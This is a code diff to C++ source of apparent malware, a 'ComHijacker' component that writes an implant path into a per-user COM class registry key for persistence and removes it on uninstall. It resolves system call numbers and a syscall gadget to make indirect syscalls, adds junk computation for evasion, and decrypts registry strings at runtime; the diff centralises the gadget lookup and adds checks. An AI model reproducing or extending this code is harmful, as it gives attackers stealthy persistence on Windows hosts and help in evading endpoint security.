@@ -28,8 +28,9 @@ bool ComHijacker::Install(const std::wstring& implantPath, const std::wstring& c
     DWORD ntOpenKeySsn = resolver.GetServiceNumber("NtOpenKey");
     DWORD ntSetValueKeySsn = resolver.GetServiceNumber("NtSetValueKey");
     DWORD ntCloseSsn = resolver.GetServiceNumber("NtClose");
+    PVOID gadget = resolver.GetSyscallGadget();
 
-    if (ntOpenKeySsn == 0xFFFFFFFF || ntSetValueKeySsn == 0xFFFFFFFF || ntCloseSsn == 0xFFFFFFFF) return false;
+    if (ntOpenKeySsn == 0xFFFFFFFF || ntSetValueKeySsn == 0xFFFFFFFF || ntCloseSsn == 0xFFFFFFFF || !gadget) return false;
 
     evasion::JunkLogic::PerformComplexMath();
 
@@ -43,7 +44,7 @@ bool ComHijacker::Install(const std::wstring& implantPath, const std::wstring& c
     InitializeObjectAttributes(&objAttr, &uHkcu, OBJ_CASE_INSENSITIVE, NULL, NULL);
 
     HANDLE hHkcu = NULL;
-    NTSTATUS status = InternalDoSyscall(ntOpenKeySsn, resolver.GetSyscallGadget(), (UINT_PTR)&hHkcu, (UINT_PTR)(KEY_ENUMERATE_SUB_KEYS | KEY_QUERY_VALUE | KEY_CREATE_SUB_KEY), (UINT_PTR)&objAttr, 0, 0, 0, 0, 0, 0, 0, 0);
+    NTSTATUS status = InternalDoSyscall(ntOpenKeySsn, gadget, (UINT_PTR)&hHkcu, (UINT_PTR)(KEY_ENUMERATE_SUB_KEYS | KEY_QUERY_VALUE | KEY_CREATE_SUB_KEY), (UINT_PTR)&objAttr, 0, 0, 0, 0, 0, 0, 0, 0);
 
     if (!NT_SUCCESS(status)) return false;
 
@@ -53,11 +54,11 @@ bool ComHijacker::Install(const std::wstring& implantPath, const std::wstring& c
     HANDLE hKey = NULL;
     status = (NTSTATUS)utils::Shared::NtCreateKeyRelative(hHkcu, relativePath, &hKey);
 
-    InternalDoSyscall(ntCloseSsn, resolver.GetSyscallGadget(), (UINT_PTR)hHkcu, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0);
+    InternalDoSyscall(ntCloseSsn, gadget, (UINT_PTR)hHkcu, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0);
 
     if (NT_SUCCESS(status)) {
         UNICODE_STRING uEmpty = {0, 0, NULL};
-        InternalDoSyscall(ntSetValueKeySsn, resolver.GetSyscallGadget(), (UINT_PTR)hKey, (UINT_PTR)&uEmpty, 0, (UINT_PTR)REG_SZ, (UINT_PTR)implantPath.c_str(), (UINT_PTR)((implantPath.length() + 1) * sizeof(wchar_t)), 0, 0, 0, 0, 0);
+        InternalDoSyscall(ntSetValueKeySsn, gadget, (UINT_PTR)hKey, (UINT_PTR)&uEmpty, 0, (UINT_PTR)REG_SZ, (UINT_PTR)implantPath.c_str(), (UINT_PTR)((implantPath.length() + 1) * sizeof(wchar_t)), 0, 0, 0, 0, 0);
 
         std::wstring tm = utils::DecryptW(kThreadingModelEnc, 14);
         UNICODE_STRING uTm;
@@ -66,9 +67,9 @@ bool ComHijacker::Install(const std::wstring& implantPath, const std::wstring& c
         uTm.MaximumLength = uTm.Length + sizeof(wchar_t);
 
         std::wstring tmVal = utils::DecryptW(kBothEnc, 4);
-        InternalDoSyscall(ntSetValueKeySsn, resolver.GetSyscallGadget(), (UINT_PTR)hKey, (UINT_PTR)&uTm, 0, (UINT_PTR)REG_SZ, (UINT_PTR)tmVal.c_str(), (UINT_PTR)((tmVal.length() + 1) * sizeof(wchar_t)), 0, 0, 0, 0, 0);
+        InternalDoSyscall(ntSetValueKeySsn, gadget, (UINT_PTR)hKey, (UINT_PTR)&uTm, 0, (UINT_PTR)REG_SZ, (UINT_PTR)tmVal.c_str(), (UINT_PTR)((tmVal.length() + 1) * sizeof(wchar_t)), 0, 0, 0, 0, 0);
 
-        InternalDoSyscall(ntCloseSsn, resolver.GetSyscallGadget(), (UINT_PTR)hKey, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0);
+        InternalDoSyscall(ntCloseSsn, gadget, (UINT_PTR)hKey, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0);
         return true;
     }
 
@@ -84,6 +85,8 @@ bool ComHijacker::Verify(const std::wstring& clsid, const std::wstring& subkey) 
     auto& resolver = evasion::SyscallResolver::GetInstance();
     DWORD ntOpenKeySsn = resolver.GetServiceNumber("NtOpenKey");
     DWORD ntCloseSsn = resolver.GetServiceNumber("NtClose");
+    PVOID gadget = resolver.GetSyscallGadget();
+    if (ntOpenKeySsn == 0xFFFFFFFF || !gadget) return false;
 
     UNICODE_STRING uPath;
     uPath.Buffer = (PWSTR)fullPath.c_str();
@@ -94,9 +97,9 @@ bool ComHijacker::Verify(const std::wstring& clsid, const std::wstring& subkey) 
     InitializeObjectAttributes(&objAttr, &uPath, OBJ_CASE_INSENSITIVE, NULL, NULL);
 
     HANDLE hKey = NULL;
-    NTSTATUS status = InternalDoSyscall(ntOpenKeySsn, resolver.GetSyscallGadget(), (UINT_PTR)&hKey, (UINT_PTR)KEY_READ, (UINT_PTR)&objAttr, 0, 0, 0, 0, 0, 0, 0, 0);
+    NTSTATUS status = InternalDoSyscall(ntOpenKeySsn, gadget, (UINT_PTR)&hKey, (UINT_PTR)KEY_READ, (UINT_PTR)&objAttr, 0, 0, 0, 0, 0, 0, 0, 0);
     if (NT_SUCCESS(status)) {
-        InternalDoSyscall(ntCloseSsn, resolver.GetSyscallGadget(), (UINT_PTR)hKey, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0);
+        InternalDoSyscall(ntCloseSsn, gadget, (UINT_PTR)hKey, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0);
         return true;
     }
     return false;
@@ -110,6 +113,9 @@ bool ComHijacker::Uninstall(const std::wstring& clsid, const std::wstring& subke
     DWORD ntOpenKeySsn = resolver.GetServiceNumber("NtOpenKey");
     DWORD ntDeleteKeySsn = resolver.GetServiceNumber("NtDeleteKey");
     DWORD ntCloseSsn = resolver.GetServiceNumber("NtClose");
+    PVOID gadget = resolver.GetSyscallGadget();
+    if (ntOpenKeySsn == 0xFFFFFFFF || !gadget) return false;
+
     UNICODE_STRING uPath;
     uPath.Buffer = (PWSTR)fullPath.c_str();
     uPath.Length = (USHORT)(fullPath.length() * sizeof(wchar_t));
@@ -117,7 +123,7 @@ bool ComHijacker::Uninstall(const std::wstring& clsid, const std::wstring& subke
     OBJECT_ATTRIBUTES objAttr;
     InitializeObjectAttributes(&objAttr, &uPath, OBJ_CASE_INSENSITIVE, NULL, NULL);
     HANDLE hKey = NULL;
-    NTSTATUS status = InternalDoSyscall(ntOpenKeySsn, resolver.GetSyscallGadget(), (UINT_PTR)&hKey, (UINT_PTR)KEY_ALL_ACCESS, (UINT_PTR)&objAttr, 0, 0, 0, 0, 0, 0, 0, 0);
+    NTSTATUS status = InternalDoSyscall(ntOpenKeySsn, gadget, (UINT_PTR)&hKey, (UINT_PTR)KEY_ALL_ACCESS, (UINT_PTR)&objAttr, 0, 0, 0, 0, 0, 0, 0, 0);
     if (NT_SUCCESS(status)) {
         std::wstring subPath = fullPath + L"\\" + subkey;
         UNICODE_STRING uSubPath;
@@ -127,12 +133,12 @@ bool ComHijacker::Uninstall(const std::wstring& clsid, const std::wstring& subke
         OBJECT_ATTRIBUTES subAttr;
         InitializeObjectAttributes(&subAttr, &uSubPath, OBJ_CASE_INSENSITIVE, NULL, NULL);
         HANDLE hSubKey = NULL;
-        if (NT_SUCCESS(InternalDoSyscall(ntOpenKeySsn, resolver.GetSyscallGadget(), (UINT_PTR)&hSubKey, (UINT_PTR)KEY_ALL_ACCESS, (UINT_PTR)&subAttr, 0, 0, 0, 0, 0, 0, 0, 0))) {
-            InternalDoSyscall(ntDeleteKeySsn, resolver.GetSyscallGadget(), (UINT_PTR)hSubKey, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0);
-            InternalDoSyscall(ntCloseSsn, resolver.GetSyscallGadget(), (UINT_PTR)hSubKey, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0);
+        if (NT_SUCCESS(InternalDoSyscall(ntOpenKeySsn, gadget, (UINT_PTR)&hSubKey, (UINT_PTR)KEY_ALL_ACCESS, (UINT_PTR)&subAttr, 0, 0, 0, 0, 0, 0, 0, 0))) {
+            InternalDoSyscall(ntDeleteKeySsn, gadget, (UINT_PTR)hSubKey, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0);
+            InternalDoSyscall(ntCloseSsn, gadget, (UINT_PTR)hSubKey, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0);
         }
-        status = InternalDoSyscall(ntDeleteKeySsn, resolver.GetSyscallGadget(), (UINT_PTR)hKey, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0);
-        InternalDoSyscall(ntCloseSsn, resolver.GetSyscallGadget(), (UINT_PTR)hKey, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0);
+        status = InternalDoSyscall(ntDeleteKeySsn, gadget, (UINT_PTR)hKey, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0);
+        InternalDoSyscall(ntCloseSsn, gadget, (UINT_PTR)hKey, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0);
     }
     return NT_SUCCESS(status);
 }
